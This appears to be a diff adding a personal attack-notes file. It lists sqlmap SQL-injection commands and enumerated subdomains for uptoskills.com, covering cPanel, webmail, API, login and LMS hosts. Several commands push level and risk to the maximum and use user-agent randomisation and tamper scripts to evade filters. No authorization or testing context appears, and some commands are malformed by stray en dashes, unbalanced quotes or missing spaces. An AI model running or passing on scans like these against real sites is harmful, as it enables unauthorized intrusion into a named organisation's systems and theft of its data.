@@ -1,0 +1,49 @@
+sqlmap -u "https://uptoskills.com/page?id=1"
+
+sqlmap -u "https://uptoskills.com/page?id=1" --dbs
+
+sqlmap -u "https://uptoskills.com/page?id=1" --dbs --level=5 --risk=3 --random-agent
+
+sqlmap -u http://uptoskills.com/  --batch --level 5 –risk 3
+
+sqlmap -u http://uptoskills.com/api/auth/login" –data="username=test&password=test
+
+sqlmap -u http://uptoskills.com –crawl=2 --threads=5--batch
+
+api.uptoskills.com
+cpanel.uptoskills.com
+webmail.uptoskills.com
+www.studylms.uptoskills.com
+  sqlmap -u "https://www.studylms.uptoskills.com" --crawl=2 --threads=5 --batch --banner
+  sqlmap -u "https://www.studylms.uptoskills.com" --forms --crawl=2 --batch --level=2
+  sqlmap -u "https://www.studylms.uptoskills.com" --crawl=2 --level=3 --risk=2 --random-agent --batch
+  sqlmap -u "https://www.studylms.uptoskills.com" --crawl=2 --tamper=space2comment,between --random-agent --batch
+
+mail.uptoskills.com
+meet.uptoskills.com
+recruitus.uptoskills.com
+connect.uptoskills.com
+connectapi.uptoskills.com
+mautic.uptoskills.com
+autodiscover.uptoskills.com
+  sqlmap -u "https://autodiscover.uptoskills.com" --batch --banner
+  
+  sqlmap -u "https://autodiscover.uptoskills.com" --crawl=2 --threads=5 --batch
+  
+  sqlmap -u "https://autodiscover.uptoskills.com" --crawl=2 --level=3 --risk=2 --batch
+
+  
+cpcalendars.uptoskills.com
+ sqlmap -u "https://cpcalendars.uptoskills.com" --batch --banner --random-agent
+ sqlmap -u "https://cpcalendars.uptoskills.com" --crawl=3 --threads=5 --batch --level=3
+ sqlmap -u "https://cpcalendars.uptoskills.com" --cookie="session_id=12345" --batch --risk=2
+ sqlmap -u "https://cpcalendars.uptoskills.com" --technique=T --level=5 --risk=3 --batch
+
+prerender.uptoskills.com
+www.uptoskills.com
+webdisk.uptoskills.com
+cpcontacts.uptoskills.com
+studylms.uptoskills.com
+
+
+
